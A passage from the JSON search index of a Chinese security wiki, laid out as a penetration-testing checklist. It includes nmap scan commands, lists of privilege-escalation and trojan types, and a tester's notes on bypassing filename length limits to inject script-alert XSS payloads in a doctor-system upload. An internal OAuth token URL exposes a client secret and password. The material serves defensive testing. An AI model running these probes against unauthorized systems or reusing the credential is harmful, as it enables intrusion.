*\u8bc1\u4e66\u52a0\u5bc6\u7b97\u6cd5\u7684\u68c0\u67e5*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#5322","text":"1\u3001\u8bc1\u4e66\u79c1\u94a5\u5728\u670d\u52a1\u5668\u7aef\u5b58\u50a8\u662f\u5426\u52a0\u5bc6 2\u3001\u8bc1\u4e66\u79c1\u94a5\u5728\u670d\u52a1\u5668\u7aef\u7684\u5b58\u50a8\u6587\u4ef6\u6743\u9650\u662f\u5426\u53ea\u6709\u6240\u6709\u8005\u53ef\u4ee5\u8bbf\u95ee ----\u6d4f\u89c8\u5668\u7aef\u5ba2\u6237\u7684CA\u6839\u8bc1\u4e66\u662f\u5426\u5b89\u5168\u53ef\u4fe1\uff0c\u8fd9\u4e2a\u65e0\u6cd5\u4fdd\u8bc1\uff08\u4e0d\u6d89\u53ca\uff09","title":"5.3.2.2. *\u8bc1\u4e66\u5bf9\u5e94\u7684\u79d8\u94a5\u4fdd\u5b58\u68c0\u67e5*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#533","text":"\u5ba2\u6237\u7aef 1\u3001\u6d4f\u89c8\u5668Cookie\u4e2d\u5b58\u50a8\uff0c\u6d4f\u89c8\u5668Cookie\u4e2d\u8bb0\u5f55\u5bc6\u6587\u5bc6\u7801 2\u3001\u6d4f\u89c8\u5668\u8bb0\u5f55\u5bc6\u7801\u4fdd\u5b58\u660e\u6587\u5bc6\u7801 \u670d\u52a1\u7aef\u660e\u6587\u5bc6\u7801\u68c0\u67e5 1\u3001 \u914d\u7f6e\u6587\u4ef6\u660e\u6587\u5bc6\u7801 2\u3001\u65e5\u5fd7\u4e2d\u8bb0\u5f55\u660e\u6587\u5bc6\u7801 3\u3001\u7a0b\u5e8f\u4e2d\u786c\u7f16\u7801\u5bc6\u7801\u3001\u5bc6\u94a5 \uff08\u9488\u5bf9\u79d8\u94a5\u573a\u666f\u7684\u7406\u89e3\uff0c\u4e3b\u8981\u9488\u5bf9\u5f53\u524d\u7684\u5f31\u7b97\u6cd5\u79d8\u94a5\u7206\u7834\u7684\u573a\u666f\uff0c\u539f\u7406\u662f\u901a\u8fc7\u5bf9\u591a\u6b21\u7684\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\u5bf9\u6bd4\u5dee\u5f02\u5c1d\u8bd5\u63a8\u5012\u79d8\u94a5\uff0c\u6709\u4e9b\u573a\u666f\u53ef\u4ee5\u8ba4\u4e3a\u662f\u5206\u95ee\u9898\u7684\uff0c\u5982\u6570\u636e\u5e93\u5bc6\u7801\u4ee5DES\u52a0\u5bc6\u5bc6\u6587\u5b58\u50a8\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u5bc6\u94a5\u5728\u4ee3\u7801\u4e2d\u786c\u7f16\u7801\uff0c\u8fd9\u79cd\u573a\u666f\u7684\u5bc6\u94a5\u786c\u7f16\u7801\u5c31\u662f\u6ca1\u6709\u95ee\u9898\u7684\uff0c\u4ed6\u7684\u5bc6\u94a5\u5728\u914d\u7f6e\u6587\u4ef6\u548c\u4ee3\u7801\u4e2d\u5176\u5b9e\u6ca1\u6709\u591a\u5927\u533a\u522b\u3002\uff09","title":"5.3.3. *\u660e\u6587\u5bc6\u7801*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#534","text":"\u4f7f\u7528search and replace\u641c\u7d22\u4ee3\u7801\u4e2d\u7684\u5173\u952e\u5b57\u3001\u654f\u611f\u5b57\uff0c\u67e5\u770b\u662f\u5426\u6709\u4e0d\u5f53\u4f7f\u7528\u7684\u5730\u65b9 1\u3001passwd\u3001password\u3001pword\u7b49 2\u3001\u4f7f\u7528\u8fc7\u7684\u5bc6\u7801111111,123456\uff0cadmin\uff0camol\u7b49","title":"5.3.4. *\u6e90\u4ee3\u7801\u654f\u611f\u4fe1\u606f\u68c0\u67e5*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#54","text":"","title":"5.4. *\u534f\u8bae*****\u4e0e********\u63a5\u53e3********\u653b\u9632****"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#541","text":"1\u3001\u8fdc\u7aef\u626b\u63cf\u5de5\u5177Nmap \u7aef\u53e3\u626b\u63cf\u547d\u4ee4 TCP\uff0cNmap -sS -T4 -p 1-65535 -oX filename.xml IP UDP\uff0cNmap -sU -T4 -p 1-65535 -oX filename.xml IP 2\u3001\u7cfb\u7edf\u68c0\u6d4b \u68c0\u67e5\u670d\u52a1\u5668\u7684\u64cd\u4f5c\u7cfb\u7edf\u7c7b\u578b\u53ca\u7248\u672c Nmap \u2013O IP 3\u3001\u8fd1\u7aef\u7aef\u53e3\u4fe1\u606f\u68c0\u67e5 \u767b\u5f55\u670d\u52a1\u5668\uff0c\u67e5\u770b\u7aef\u53e3\u8be6\u7ec6\u4fe1\u606f lsof \u2013i:port ps \u2013ef|grep pid 4\u3001\u6574\u7406\u7cfb\u7edf\u5f00\u653e\u7aef\u53e3\u7684\u8be6\u7ec6\u5217\u8868","title":"5.4.1. *\u7aef\u53e3\u626b\u63cf*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#542","text":"1\u3001\u4f7f\u7528\u547d\u4ee4nmap -sV -Pn -p port IP\uff0c\u63a2\u6d4b\u7aef\u53e3\u7684\u8be6\u7ec6\u670d\u52a1\u53ca\u7248\u672c -Pn\uff1a\u5728\u626b\u63cf\u4e4b\u524d\uff0c\u4e0d\u53d1\u9001ICMP echo\u8bf7\u6c42\u6d4b\u8bd5\u76ee\u6807\u662f\u5426\u6d3b\u8dc3\u3002 -sV\uff1a\u63a2\u7d22\u5f00\u653e\u7684\u7aef\u53e3\uff0c\u786e\u5b9a\u670d\u52a1\u5668/\u7248\u672c\u4fe1\u606f","title":"5.4.2. *\u7aef\u53e3\u670d\u52a1\u63a2\u6d4b*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#543-rest-web-service","text":"","title":"5.4.3. *REST WEB Service\uff08\u63a5\u53e3\u534f\u8bae\uff09*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#544-soap","text":"Soap\u6ce8\u5165","title":"5.4.4. *SOAP*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#545-ssh","text":"\u653e\u5230\u64cd\u4f5c\u7cfb\u7edf\u90e8\u5206\uff0c\u8fd9\u4e2a\u7ec4\u4ef6\u548c\u64cd\u4f5c\u7cfb\u7edf\u5f3a\u76f8\u5173","title":"5.4.5. *SSH\u534f\u8bae*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#546-im-xmpp","text":"http ://wiki.xmpp.org/web/Securing_XMPP IM\u670d\u52a1\u68c0\u67e5\uff1a https://xmpp.net Tigase\u7528\u6237\u6307\u5357\uff1a http://docs.tigase.org/tigase-server/snapshot/Administration_Guide/html_chunk/index.html Tigase XMPP (Jabber) server ver 7.0.2 IM\u670d\u52a1\u5668\u5982\u4f55\u6d4b\u8bd5\uff1f\uff1f\uff1f http://my.oschina.net/greki/blog/210393 Tigase-server Tigase-client http://localhost:8080/setup/\u8fdb\u5165tigase\u540e\u53f0","title":"5.4.6. *IM\u670d\u52a1-XMPP\u534f\u8bae*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#547","text":"\u83b7\u53d6token\uff1a http://192.168.1.120:8080/amol-back/oauth/token?client_id=amol_client_mbox&client_secret=amol_secret_mbox&grant_type=password&username=mbox&password=123456 1\u3001\u94fe\u8def\u52a0\u5bc6 2\u3001\u53c2\u6570\u6821\u9a8c - 3\u3001\u8bbf\u95ee\u6570\u9650\u5236- \u53c2\u6570\uff1a \u4f7f\u7528burp\u904d\u5386\u7528\u4f8bpayload 1)\u7279\u6b8a\u5b57\u7b26 \u82f1\u6587\u5b57\u7b26 [~!@#$%^&*()____+{}|:\u201d<>?-=;\u2019,./ ](mailto:~!@#$%^&*()____+{}|:\\\u201d<>?-=;\u2019,./ ) \u4e2d\u6587\u5b57\u7b26 ~\uff01@#\uffe5%\u2026\u2026&*\uff08\uff09\u2014\u2014+\uff1a\u201c\u300a\u300b\uff1f\uff0c\u3002\u3001\u2018\uff1b\u3001\u3011\u3010\u00b7 \u4e2d\u6587\u6c49\u5b57 \u54c8\u54c8 2\uff09sql\u6ce8\u5165 3\uff09XSS 4\uff09\u7eaf\u6570\u5b57\u3001\u7eaf\u82f1\u6587\u3001\u7ec4\u5408\u3001\u5927\u5c0f\u5199\u3001 5\uff09\u6362\u884c 6\uff09\u8d85\u957f 7\uff09\u7a7a","title":"5.4.7. *\u5916\u90e8\u63a5\u53e3\u5b89\u5168*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#548-ssltsl","text":"https\u7b49\u5176\u4ed6\u534f\u8bae\u4f7f\u7528\u7684\u52a0\u5bc6\u534f\u8baeSSL/TSL\u662f\u5426\u662f\u5b89\u5168\u7684\uff0c\u4f7f\u7528\u5f00\u6e90\u5de5\u5177sslsplit\u68c0\u6d4b\uff0c\u5de5\u5177\u4e0b\u8f7d\u5730\u5740https://github.com/droe/sslsplit/tree/7677fe06557509e95e548318909c1a328b6f6069\u3002 \u68c0\u67e5\u52a0\u534f\u8bae\u7248\u672c\u53ca\u5957\u4ef6\u7684\u529e\u6cd5Nmap -sV -p port --script ssl-enum-ciphers ip 1\u3001\u52a0\u5bc6\u534f\u8baeSSLv2v3\u9700\u8981\u5168\u90e8\u7981\u7528 2\u3001TSL\u7684\u52a0\u5bc6\u5bc6\u5957\u4ef6\u90e8\u5206\u5df2\u7ecf\u4e0d\u5b89\u5168\u9700\u8981\u914d\u7f6e\u5220\u9664","title":"5.4.8. *SSL/TSL*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#549-wifi","text":"\u5bf9\u8c61\uff08Wep\u3001Wpa\uff09\u3001\u539f\u7406\u3001\u5de5\u5177","title":"5.4.9. *WiFi\u5b89\u5168*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#55","text":"http://www.centoscn.com/CentosSecurity/ \u5de5\u5177\uff1aopenvas\u3001nessus \u6d4b\u8bd5\u65b9\u5f0f\uff1a\u53ef\u5728\u672c\u5730\u5b89\u88c5nessus home\u7248\u5b8c\u6765\u6d4b\u8bd5 \u5f71\u54cd\u8f83\u5927\u7684\u6f0f\u6d1e CVE-2016-5195\uff1aLinux\u7cfb\u7edf\u672c\u5730\u63d0\u6743\u6f0f\u6d1e\uff0c\u810f\u725b\u6f0f\u6d1e\u3002\uff082016-10\uff09\u3010\u901a\u5403\u578b\u3011\u3002","title":"5.5. *\u64cd\u4f5c\u7cfb\u7edf\u5b89\u5168*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#551","text":"1\uff09Windows\u4e0b\u63d0\u6743\uff08\u6211\u4eec\u662flinux\u670d\u52a1\u5668\uff0c\u8fd9\u4e2a\u6682\u65f6\u4e0d\u5173\u6ce8\uff09 2\uff09Linux\u4e0b\u63d0\u6743---- l \u5229\u7528\u7cfb\u7edf\u6f0f\u6d1e\u63d0\u6743\uff08\u4e3b\u52a8\u63d0\u6743\uff09 l \u914d\u7f6e\u4e0d\u5f53\u63d0\u6743\uff08\u88ab\u52a8\u63d0\u6743\uff09 Sudo\u63d0\u6743---/etc/sudoers\u6587\u4ef6\u914d\u7f6e Crontab\u63d0\u6743--\u5b9a\u65f6\u6267\u884c\u7684\u811a\u672c\u7684\u6743\u9650\u914d\u7f6e Init.d\u63d0\u6743--/etc/init.d\u6b64\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u7684\u5199\u6743\u9650\u8981\u4e25\u683c\u7981\u6b62 Environment\u63d0\u6743--\u7528\u6237\u7684profile\u3001environment\u7b49\u7684\u6743\u9650\u8bbe\u7f6e\u3001\u8fd8\u6709su\u547d\u4ee4\u800c\u4e0d\u662fsu - \u65b9\u5f0f\u5207\u6362\u5230root\u7528\u6237 Setuid\u63d0\u6743--\u901a\u8fc7\u7ed9\u811a\u672c\u6216\u8005bash\u6dfb\u52a0s\u6743\u9650\u83b7\u53d6root\u6743\u9650","title":"5.5.1. *\u672c\u5730\u63d0\u6743*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#552","text":"\u952e\u76d8\u8bb0\u5f55\u6728\u9a6c \u7ed1\u5b9a\u7aef\u53e3\u6728\u9a6c \u56de\u8fde\u6728\u9a6c \u7aef\u53e3\u590d\u7528\u6728\u9a6c \u8fdc\u7a0b\u63a7\u5236\u6728\u9a6c","title":"5.5.2. *\u5404\u79cd\u6728\u9a6c*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#553","text":"\u672c\u5730\u7834\u89e3--md5\u3001linux shadow\u3001ntlm/lm \u8fdc\u7a0b\u7834\u89e3--ssh\u3001httpauth\u3001webform\u3001pop/Smtp","title":"5.5.3. *\u5bc6\u7801\u7834\u89e3*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#56","text":"Mysql http://www.w3resource.com/mysql/mysql-security.php Redis \u5f71\u54cd\u8f83\u5927\u7684\u6f0f\u6d1e\uff1a CVE-2016-6662 mysql\u672c\u5730\u63d0\u6743\u6f0f\u6d1e\u3002\uff082016-9\uff09","title":"5.6. *\u6570\u636e\u5e93\u5b89\u5168*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#57","text":"1\u3001\u4e0b\u8f7d\u7684\u8f6f\u4ef6\u6709\u6ca1\u6709\u63d0\u4f9b\u7b7e\u540d 2\u3001\u4e0b\u8f7d\u540e\u5b89\u88c5\u662f\u5426\u6709\u6821\u9a8c\u673a\u5236","title":"5.7. *\u8f6f\u4ef6\u7684\u53d1\u5e03\u4e0e\u5b89\u88c5\u5b89\u5168*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#58","text":"1\u3001app\u7684\u7b7e\u540d\u3001\u53cd\u9006\u5411 \uff08apk\u52a0\u56fa\u6b65\u9aa4\uff1a http://jingyan.baidu.com/article/b2c186c8cd1a71c46ef6ffcd.html \uff0c\u6570\u5b57\u7b7e\u540d\uff1a http://blog.csdn.net/kickxxx/article/details/18252881 \uff09 2\u3001\u7528\u6237\u9690\u79c1 \u672c\u5730\u4fdd\u5b58\u7528\u6237\u5bc6\u7801\u3001\u65e0\u8bba\u52a0\u5bc6\u4e0e\u5426 \u654f\u611f\u4fe1\u606f\u9690\u79c1\u4fe1\u606f\uff0c\u5982\u804a\u5929\u8bb0\u5f55\u3001\u5173\u7cfb\u94fe\u3001\u94f6\u884c\u5361\u53f7\u7b49\u662f\u5426\u52a0\u5bc6\u4fdd\u5b58 \u914d\u7f6e\u6587\u4ef6\u7b49\u662f\u5426\u4fdd\u5b58\u5230\u5916\u90e8\u8bbe\u5907\u4e0a \u4fdd\u5b58\u5230\u5916\u90e8\u8bbe\u5907\u7684\u4fe1\u606f\u52a0\u8f7d\u524d\u5224\u65ad\u662f\u5426\u88ab\u7be1\u6539 3\u3001\u6587\u4ef6\u6743\u9650 App\u6240\u5728\u76ee\u5f55\u4e0d\u5141\u8bb8\u5176\u4ed6\u7ec4\u6210\u5458\u8bfb\u5199 4\u3001\u7f51\u7edc\u901a\u8baf \u91cd\u8981\u654f\u611f\u6570\u636e\u4f20\u8f93\u52a0\u5bc6 5\u3001\u8fd0\u884c\u65f6\u89e3\u91ca\u4fdd\u62a4 \u5d4c\u6709\u89e3\u91ca\u5668\u7684\u8f6f\u4ef6XSS\u3001SQL\u6ce8\u5165\u7b49 \u5916\u90e8\u8fde\u63a5\u7684\u662f\u5426\u6709URL\u6b3a\u9a97\u7b49\u6f0f\u6d1e 6\u3001\u7ec4\u4ef6\u6743\u9650\u4fdd\u62a4 \u7981\u6b62App\u5185\u90e8\u7ec4\u4ef6\u88ab\u4efb\u610f\u7b2c\u4e09\u65b9\u7a0b\u5e8f\u8c03\u7528 \u8c03\u7528\u5916\u90e8\u7ec4\u4ef6\u5148\u9a8c\u8bc1\u7b7e\u540d 7\u3001\u5347\u7ea7 \u5347\u7ea7\u5305\u5b8c\u6574\u6027\u3001\u5408\u6cd5\u6027\u6821\u9a8c\uff0c\u907f\u514d\u88ab\u52ab\u6301 8\u30013rd\u5e93 \u8ddf\u8fdb\u7b2c\u4e09\u65b9\u5e93\u7684\u66f4\u65b0 http://blog.nsfocus.net/mobile-app-security-security-test/ http://www.zhihu.com/question/24083362","title":"5.8. *\u624b\u673a\u7aef\u7684\u5b89\u5168*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#59","text":"1\u3001\u5371\u9669\u51fd\u6570\u3001\u65b9\u6cd5\u3001\u5173\u952e\u5b57 2\u3001\u5de5\u5177\u68c0\u6d4b findbugs 3\u3001\u903b\u8f91\u6f0f\u6d1e","title":"5.9. *\u9759\u6001\u4ee3\u7801\u5206\u6790\uff08\u7eaf\u767d\u76d2\uff09*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#510","text":"1\u3001\u524d\u53f0\u529f\u80fd\u6267\u884c\u3001\u4e2d\u95f4\u5de5\u5177\u6293\u5305\u3001\u540e\u7aef\u4ee3\u7801\u8d70\u8bfb\u7684\u5f62\u5f0f\uff08\u8fc7\u7a0b\uff1a\u7ed3\u5408\u4e1a\u52a1\u601d\u8def\u67e5\u770b\u4e2d\u95f4\u53c2\u6570\u3001\u8d70\u8bfb\u540e\u7aef\u4ee3\u7801\u8ddf\u8e2a\u53c2\u6570\u5904\u7406\uff0c\u7ed3\u5408\u5e38\u89c1WEB\u5b89\u5168\u6f0f\u6d1e\u5f62\u5f0f\u5339\u914d\u95ee\u9898\uff0c\u6293\u5305\u91cd\u653e\u9a8c\u8bc1\u95ee\u9898\u3002\uff09 2\u3001\u53ef\u53d1\u73b0\u7684\u5e38\u89c1\u6f0f\u6d1e\u5f62\u5f0f\uff1a\u8d8a\u6743\u3001XSS\u3001sql\u6ce8\u5165\u3001\u53c2\u6570\u5408\u7406\u6027\u7b49","title":"5.10. *\u6293\u5305\u8d70\u8bfb\u4ee3\u7801\uff08\u7070\u76d2\u6d4b\u8bd5\uff09*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#6","text":"\u653b\u51fb\u9762\u6700\u5c0f\u5316 \u9ed8\u8ba4\u5b89\u5168 \u6700\u5c0f\u6743\u9650\u539f\u5219 \u6df1\u5ea6\u9632\u5fa1\u539f\u5219\uff08\u591a\u89d2\u5ea6\u3001\u5197\u4f59\u7684\uff09 \u5b89\u5168\u7684\u5931\u8d25 \u5916\u90e8\u7cfb\u7edf\u662f\u4e0d\u5b89\u5168\u7684 \u804c\u8d23\u5206\u79bb\uff08\u6743\u503c\u5206\u79bb\uff09 \u4e0d\u4f9d\u8d56\u9690\u6666\u7684\u5b89\u5168\u6027 \u7b80\u5355 \u6b63\u786e\u7684\u4fee\u590d\u5b89\u5168\u6027\u95ee\u9898 \u5ba2\u6237\u7aef\u7684\u8f93\u5165\u662f\u4e0d\u53ef\u4fe1\u7684 \u6211\u7684\u7406\u89e3\u7684\u5224\u65ad\u4f9d\u636e\uff1a 1\u3001\u6211\u4eec\u8bbe\u8ba1\u7684\u7a0b\u5e8f\u7684\u52a8\u4f5c\u662f\u786e\u5b9a\u7684\uff0c\u800c\u7a0b\u5e8f\u8fd0\u884c\u4e2d\u4ea7\u751f\u4e86\u8d85\u51fa\u8fd9\u4e2a\u9884\u671f\u52a8\u4f5c\u7684\u90e8\u5206\uff0c\u6211\u4eec\u90fd\u53ef\u8ba4\u4e3a\u5b83\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u9700\u8981\u6539\u6b63\u7684\u3002 2\u3001\u95ee\u9898\u4ea7\u751f\u5728\u6211\u4eec\u7684\u8bbe\u8ba1\u5f97\u7a0b\u5e8f\u52a8\u4f5c\u672c\u8eab\u5c31\u662f\u4e0d\u7b26\u5408\u73b0\u6709\u7684\u5927\u73af\u5883\u4e0b\u7684\u5b89\u5168\u6807\u51c6\u3002","title":"6. *\u5b89\u5168\u6d4b\u8bd5\u7684\u539f\u5219*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#7","text":"http://www.owasp.org.cn/ OWASP \u6d4b\u8bd5\u6307\u5357 http://www.wooyun.org/ http://bbs.51cto.com/thread-1039046-1.html","title":"7. *\u53c2\u8003\u8d44\u6599*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#8","text":"","title":"8. *\u7cfb\u7edf\u7ed3\u6784\u7b80\u56fe*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#9","text":"1\u3001Burpsuit 2\u3001Watchweb 3\u3001Httprint 4\u3001Httpwatch 5\u3001Appscan 6\u3001Awvs 7\u3001Nmap 8\u3001Search and replace 9\u3001Sqlmap 10\u3001secureCAT 11\u3001--\u9a8c\u8bc1\u7801\u8bc6\u522b\u5de5\u5177 12\u3001--Whois\u67e5\u8be2 13\u3001DirBuster 14\u3001Fiddler 15\u3001Wireshark 16\u3001Firefox hackbar 17\u3001\u5728\u7ebfjs\u6267\u884c\uff08 http://js.do/ \uff09","title":"9. *\u6d89\u53ca\u7684\u5e38\u7528\u5de5\u5177*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#91-xss","text":"1\u3001\u6b64\u79cd\u95ee\u9898\u7684\u7279\u70b9\uff1a\u9996\u5148\uff0c\u662f\u4e0a\u4f20\u70b9\uff1b\u7b2c\u4e8c\uff0c\u5728\u4e0a\u4f20\u540e\u4f7f\u7528\u4e86\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\uff08\u53ef\u80fd\u53c8\u6539\u540d\uff0c\u4f46\u662f\u8bb0\u5f55\u4e86\u6587\u4ef6\u540d\uff09\uff1b 2\u3001\u7cfb\u7edf\u95ee\u9898\u53d1\u751f\u70b9\u533b\u751f\u7cfb\u7edf-\u7ec8\u5ba1\u62a5\u544a-\u9644\u4ef6 3\u3001\u6b64\u5904\u7b26\u5408\u4e861\uff0c\u67e5\u770b\u663e\u793a\u6587\u4ef6\u540d\u7684\u754c\u9762\u7684\u4ee3\u7801 aaa.gif \u4ee5\u4e0a\u8bed\u53e52\u5904\u51fa\u73b0\u4e86\u6587\u4ef6\u540d\uff0c\u5373\u6709\u4e24\u4e2a\u5730\u65b9\u662f\u6211\u4eec\u53ef\u80fd\u6ce8\u5165\u4ee3\u7801\u7684\u5730\u65b9 \u5148\u770b\u540e\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u8d85\u94fe\u63a5\u5185\u7684\u6587\u5b57\uff0c\u666e\u901a\u6587\u672c \u8003\u8651\u5c1d\u8bd5\u6700\u7b80\u5355\u7684 alert(1) \uff0c\u5c1d\u8bd5\u8bbe\u7f6e\u6587\u4ef6\u540d\u4e3a alert(1) a.gif \u53d1\u73b0\u5b57\u7b26/\u540e\u7684\u90e8\u5206\u88ab\u4f5c\u4e3a\u4e86\u6587\u4ef6\u540d\uff0c\u8003\u8651\u540e\u53f0\u4ee3\u7801\u6709\u5b57\u7b26\u622a\u65ad\u6216\u8005\u9650\u5236\u957f\u5ea6\u3002\u5e76\u4e14\u786e\u8ba4\u6211\u4eec\u7684\u5b57\u7b26<>\u662f\u63a5\u53d7\u7684\u3002 \u4e0b\u4e00\u6b65\u8bbe\u7f6e\u6587\u4ef6\u540d\u4e3aaaaaaaaaaaa.gif\uff0c\u53d1\u9001\u591a\u6b21\u5c1d\u8bd5\u786e\u8ba4\u6587\u4ef6\u540d\u53ef\u4ee5\u7684\u6700\u957f\u957f\u5ea6\u4e3a24\u4e2a\u5b57\u7b26\uff0c\u4e5f\u5c31\u662f\u540e\u7f00\u524d\u9762\u7684\u4ee3\u7801\u53ea\u80fd\u670920\u4e2a\u5b57\u7b26\u3002 \u518d\u5c1d\u8bd5 b.gif\uff0c\u786e\u8ba4/ \u5931\u8d25\uff0c\u4ec0\u4e48\u539f\u56e0\uff1f\u518d\u5c1d\u8bd5a/b.gif \u786e\u8ba4/\u662f\u6709\u7279\u6b8a\u5904\u7406\u7684\uff0c\u4f1a\u88ab\u622a\u65ad\uff0c\u90a3\u4e48\u5176\u4ed6\u7f16\u7801\u8bd5\u8bd5\uff1f alert(1) alert(2)<%2Fscript> <%2Fscript>\u53ef\u4e0a\u4f20\uff0c\u53ef\u662f\u6574\u4f53\u8d85\u957f <script>alert(3) \u53ef\u4e0a\u4f20\uff0c\u53ef\u662f\u6574\u4f53\u8d85\u957f alert(4) 1 \u53ef\u4e0a\u4f20\uff0c\u53ef\u662f\u6574\u4f53\u8d85\u957f alert(5)<\\u2fscript> \\\u548c/\u540c\u6837\u7684\u6548\u679c <script>alert(6)<\\u002fscript> \\\u548c/\u540c\u6837\u7684\u6548\u679c \u597d\u5427\uff0c\u6362\u4e2a\u601d\u8def\uff1b\u8fd9\u4e2a\u5730\u65b9\u6709\u591a\u4e2a\u6587\u4ef6\u4e0a\u4f20\uff0c\u80fd\u4e0d\u80fd\u7528\u4e24\u4e2a\u6587\u4ef6\u540d\u7ec4\u5408\uff1f\u8bd5\u8bd5 \u4e0a\u4f20<script>a.gif \u518d\u4e0a\u4f20<alert(2)<%2Fscript>b.gif ![img](file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\ksohtml17636\\wps10.jpg) ![img](file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\ksohtml17636\\wps11.jpg) \u5237\u65b0\u754c\u9762\u770b\u4e0b ![img](file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\ksohtml17636\\wps12.jpg) \u8fd8\u662f\u4e0d\u80fd\u6267\u884c\uff0c\u540e\u9762\u7684\u811a\u672c\u90fd\u88ab\u5f53\u6210javascript\u811a\u672c\u5185\u5bb9\u89e3\u6790\u4e86\uff0c%2F\u4e0d\u4f1a\u88ab\u6d4f\u89c8\u5668\u7f16\u7801\u53cd\u89e3\u6790\u56de\u6765\uff1b\u53ea\u80fd\u662f\u5c4f\u853d\u4e86\u4e0b\u9762\u7684\u5230 \u524d\u7684\u6240\u6709\u4ee3\u7801\uff0c\u5176\u5b9e\u8fd9\u91cc\u53ef\u4ee5\u8bf4\u5df2\u7ecf\u662f\u6709\u95ee\u9898\u4e86\uff0c\u6539\u53d8\u4e86\u539f\u6765\u754c\u9762\u7684\u8bed\u4e49 